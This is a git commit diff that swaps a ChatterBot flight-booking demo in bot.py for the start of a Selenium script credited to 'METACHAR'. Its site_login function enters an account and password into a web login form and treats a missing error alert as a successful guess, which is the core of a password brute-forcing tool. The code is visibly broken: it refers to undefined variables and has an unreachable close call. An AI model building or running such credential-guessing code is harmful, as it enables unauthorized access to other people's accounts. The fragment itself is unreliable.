2a119d7b000aecafd951e470629a83b4fa1f297a
BillPham12 <ypham@cmail.carleton.ca>
2021-02-26 14:36:23 -0500

    using selenium

--- bot.py
+++ bot.py
@@ -1,18 +1,35 @@
-from chatterbot import ChatBot
-from chatterbot.trainers import ListTrainer
+# Coded by METACHAR
+# Looking to work with other hit me up on my email @metachar1@gmail.com <--
+import sys
+import datetime
+import selenium
+import requests
+import time as t
+from sys import stdout
+from selenium import webdriver
+from optparse import OptionParser
+from selenium.webdriver.common.keys import Keys
+from selenium.common.exceptions import NoSuchElementException
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from webdriver_manager.chrome import ChromeDriverManager
+from selenium.webdriver import ActionChains
 
-# Create a new chat bot named Charlie
-chatbot = ChatBot('Charlie')
 
-trainer = ListTrainer(chatbot)
-
-trainer.train([
-    "Hi, can I help you?",
-    "Sure, I'd like to book a flight to Iceland.",
-    "Your flight has been booked."
-])
-
-# Get a response to the input text 'I would like to book a flight.'
-response = chatbot.get_response('I would like to book a flight.')
-
-print(response)
+optionss = webdriver.ChromeOptions()
+optionss.add_argument("--disable-popup-blocking")
+optionss.add_argument("--disable-extensions")
+driver = webdriver.Chrome(ChromeDriverManager().install())
+def site_login(url,account,password):
+    print("Trying password", passw, "current target is ",target, "on url", url)
+    driver.get(url)
+    driver.find_element_by_class_name("nick").send_keys(account)
+    driver.find_element_by_class_name('pass').send_keys(password)
+    driver.find_element_by_class_name("cont.button-border").click()
+    try:
+        x = driver.find_element_by_class_name("alert.alert-danger")
+        return password, False
+    except NoSuchElementException:
+        return password, True
+    driver.close()
